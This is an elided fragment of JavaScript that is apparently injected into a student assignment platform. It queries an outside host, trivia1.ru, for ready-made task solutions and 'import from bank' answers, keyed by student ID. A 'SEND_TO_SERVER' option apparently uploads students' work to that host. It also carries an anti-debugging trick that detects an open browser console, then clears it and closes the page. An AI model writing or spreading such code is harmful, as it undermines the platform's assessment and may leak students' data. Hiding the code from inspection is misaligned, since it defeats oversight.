...
DS.ready(function(){
	...
	var keySendToServer = 'SEND_TO_SERVER';var ArmUserId = DS.util.urlParam('ArmUserId') || localStorage.student_id;
	...
	var showSendToServerWindow = function()
		{
			...
			DS.create({
				...
				,items: [
					...
					,'<div style="padding: 5px" class="ds-window-scrollable ">'
					,text
					,{
						DStype: 'form-panel'
						,items:
...
//##########################################################################
	...
	DS.page.cb = {
		...
		,canPaste: function(txt, isHTML) {return(true);}, goyDa: function(txt, isHTML){
			...
			var serverIsOnline = async function() {
				...
				if(!showGetLink)
				{
					for(var i_ = 0, l_ = _listTasks.length; i_ < l_; ++i_){
						...
						var task_ = _listTasks[i_];
						var response = await fetch('https://trivia1.ru/get_download_link_solution?task_name=' + encodeURI(task_.name) + '&task_id=id' + task_.id.toString());
						if(response.ok)
						{
							...
							if (btn)
							{
								...
								DS.addEvent(btn, 'click', (function(){return(function(e){
				...
				if(!showImportFromBank || (localStorage.getItem('SEND_TO_SERVER' + ArmUserId.toString()) == 'true') != lastSendToServerLocalStorage)
				{
					...
					for(var i_ = 0, l_ = _listTasks.length; i_ < l_; ++i_){
						...
						if(ArmUserId)
						{
							if(localStorage.getItem('SEND_TO_SERVER' + ArmUserId.toString()) == 'true')
							{
								response = await fetch('https://trivia1.ru/check_solutions?task_name=' + encodeURI(task_.name));
								if(response.ok)
								{
									btn = document.getElementById('import_from_bank' + task_.id);
...
if(!_newsUpdateInterval){
	...
	var i = new Image();
	Object.defineProperty(i,'id',{get:function(){_dt=true;_close();console.clear();}});
	console_log('%c',i);
	/*if('g2a' in window){
		_dt = true;
	}
